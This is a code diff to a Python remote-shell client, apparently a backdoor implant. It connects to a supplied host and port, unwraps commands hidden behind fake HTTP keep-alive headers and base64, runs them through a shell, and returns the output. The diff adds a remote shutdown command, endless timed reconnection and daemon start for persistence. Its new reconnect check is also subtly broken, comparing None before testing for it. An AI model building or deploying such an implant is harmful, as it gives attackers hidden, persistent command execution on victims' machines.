@@ -18,7 +18,10 @@ def connection(host, port):
         while True:
             data = s.recv(4096)
             try:
-                data = decryption_req(data).decode()
+                data = decryption_res(data).decode()
+                if data == '\\!shutdown':
+                    print('接收到终止进程的指令')
+                    sys.exit(0)
                 comRst = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                           stdin=subprocess.PIPE)
                 m_stdout, m_stderr = comRst.communicate()
@@ -91,7 +94,7 @@ def encryption_req(data):
 
 
 # 解密
-def decryption_req(data):
+def decryption_res(data):
     data = data.decode()
     data = data[data.find("Connection: keep-alive\r\n\r\n") + 26:]
     data = str(base64.b64decode(data), "utf-8")
@@ -103,13 +106,13 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser()
     parser.add_argument('-host', dest='hostName', help='Host Name')
     parser.add_argument('-port', dest='conPort', help='Host Port')
-    parser.add_argument('-reconnection', '-recon', dest='reconnection', type=int, nargs='?', default=0, help='Reconnection times. Up to 100 times.')
+    parser.add_argument('-always', dest='always', type=int, nargs='?', default=False, help='Set the reconnection interval (s).)')
     parser.add_argument('--daemon', nargs='?', default=False, help='Daemon Start')
     # 解析命令行参数
     args = parser.parse_args()
     host = args.hostName
     port = args.conPort
-    reconnection = args.reconnection
+    always = args.always
     daemon = args.daemon
 
     if host == None or port == None:
@@ -118,23 +121,31 @@ if __name__ == '__main__':
         print(parser.parse_args(['-h']))
         exit(0)
 
-    if reconnection < 0:
-        reconnection = 0
-    for n in range(reconnection + 1):
-        if n > 0:
-            print("3秒后尝试重新连接(%d)..." % n)
-            time.sleep(3)
+    # 定义连接次数
+    global conntimes
+    conntimes = 0
 
+    while True:
+        conntimes += 1
         if daemon != False:
             # 守护进程启动
             import platform
             import re
 
             if re.search('Windows', platform.system(), re.IGNORECASE):
-                print('Windows system does not support daemon startup for the time being, and has switched to non-daemon mode.')
-                print('Windows系统暂不支持守护进程启动，已切换为非守护进程方式。')
+                if conntimes == 1:
+                    print('Windows system does not support daemon startup for the time being, and has switched to non-daemon mode.')
+                    print('Windows系统暂不支持守护进程启动，已切换为非守护进程方式。')
                 connection(host, port)
             else:
                 daemonize(host=host, port=port)
         else:
             connection(host, port)
+
+        if always != False and always > 0:
+            if always is None:
+                always = 10
+            print("%d秒后尝试重新连接(%d)..." % (always, conntimes))
+            time.sleep(always)
+        else:
+            break
